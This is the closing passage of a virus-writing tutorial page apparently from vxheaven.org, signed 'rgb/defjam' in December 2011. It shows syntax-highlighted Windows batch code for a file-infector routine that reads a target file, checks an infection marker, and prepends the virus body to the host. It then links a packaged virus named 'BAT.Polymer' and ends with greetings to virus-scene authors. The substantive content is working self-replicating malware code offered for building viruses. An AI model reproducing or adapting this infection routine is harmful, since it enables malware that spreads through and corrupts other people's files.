&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/call.html"><span style="color: #00b100; font-weight: bold;">call</span></a> :<span style="color: #b100b1; font-weight: bold;">inf</span> <span style="color: #33cc33;">!</span><span style="color: #448888;">_atok</span><span style="color: #33cc33;">!</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #33cc33;">)</span><br/>
<span style="color: #33cc33;">)</span><br/>
<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> :<span style="color: #b100b1; font-weight: bold;">eof</span><br/>
<br/>
:<span style="color: #b100b1; font-weight: bold;">inf</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; rem read a line from the target file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/for.html"><span style="color: #00b100; font-weight: bold;">for</span></a> /f &quot;tokens=*&quot; <span style="color: #33cc33;">%%</span><span style="color: #448888;">b</span> <a style="color: #000060;" href="http://www.ss64.com/nt/in.html"><span style="color: #00b100; font-weight: bold;">in</span></a> <span style="color: #33cc33;">(</span> <span style="color: #33cc33;">%</span><span style="color: #448888;">1</span> <span style="color: #33cc33;">)</span> <a style="color: #000060;" href="http://www.ss64.com/nt/do.html"><span style="color: #00b100; font-weight: bold;">do</span></a> <span style="color: #33cc33;">(</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/set.html"><span style="color: #b1b100; font-weight: bold;">set</span></a> _atok=<span style="color: #33cc33;">%%</span><span style="color: #448888;">b</span><br/>
<span style="color: black; font-style: italic;"><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rem check for infection marker</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rem 2 characters starting at position 1</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rem here marker is first line is &quot;if&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">if</span></a> /i &quot;<span style="color: #33cc33;">!</span><span style="color: #448888;">_atok:~1,2</span><span style="color: #33cc33;">!</span>&quot; <a style="color: #000060;" href="http://www.ss64.com/nt/neq.html"><span style="color: #000000; font-weight: bold;">neq</span></a> &quot;if&quot; <span style="color: #33cc33;">(</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rem rename host to temporary name</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/ren.html"><span style="color: #b1b100; font-weight: bold;">ren</span></a> <span style="color: #33cc33;">%</span><span style="color: #448888;">1</span> rb<br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rem prepend us to original filename</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rem cannot prepend to existing file</span><br/>
<span style="color: black; font-style: italic;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rem because file will be overwritten instead</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/copy.html"><span style="color: #b1b100; font-weight: bold;">copy</span></a> rc + rb <span style="color: #33cc33;">%</span><span style="color: #448888;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/del.html"><span style="color: #b1b100; font-weight: bold;">del</span></a> rb<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #33cc33;">)</span><br/>
<span style="color: black; font-style: italic;"><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rem break loop after one line</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/goto.html"><span style="color: #00b100; font-weight: bold;">goto</span></a> :<span style="color: #b100b1; font-weight: bold;">eof</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #33cc33;">)</span><br/>
&nbsp;</div>
<p>All done</p>
<p>Once we put all of that together, we have something like <a href="/src.php?info=impute.zip">BAT.Polymer</a>. :)</p>
<h2><a name="cn"></a>Greets to friendly people (A-Z):</h2>
<p>Active - Benny - herm1t - hh86 - jqwerty - Malum - Obleak - Prototype - Ratter - Ronin - RT Fishel - sars - SPTH - The Gingerbread Man - Ultras - uNdErX - Vallez - Vecna - Whitehead</p>
<div align="right">rgb/defjam dec 2011<br/><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d0b9b1bd8fa2b7b290b8bfa4bdb1b9bcfeb3bfbd">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></div>
[<a style="" href="/lib/?lang=EN&amp;index=MA#vrg20">Back to index</a>] [<a href="/lib/vrg20.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vrg20">de</a><a href="/lib/index.php?lang=en&amp;id=vrg20">en</a><a href="/lib/index.php?lang=es&amp;id=vrg20">es</a><a href="/lib/index.php?lang=it&amp;id=vrg20">it</a><a href="/lib/index.php?lang=fr&amp;id=vrg20">fr</a><a href="/lib/index.php?lang=pl&amp;id=vrg20">pl</a><a href="/lib/index.php?lang=ru&amp;id=vrg20">ru</a><a href="/lib/index.php?lang=ua&amp;id=vrg20">ua</a></div>
</body>
</html>
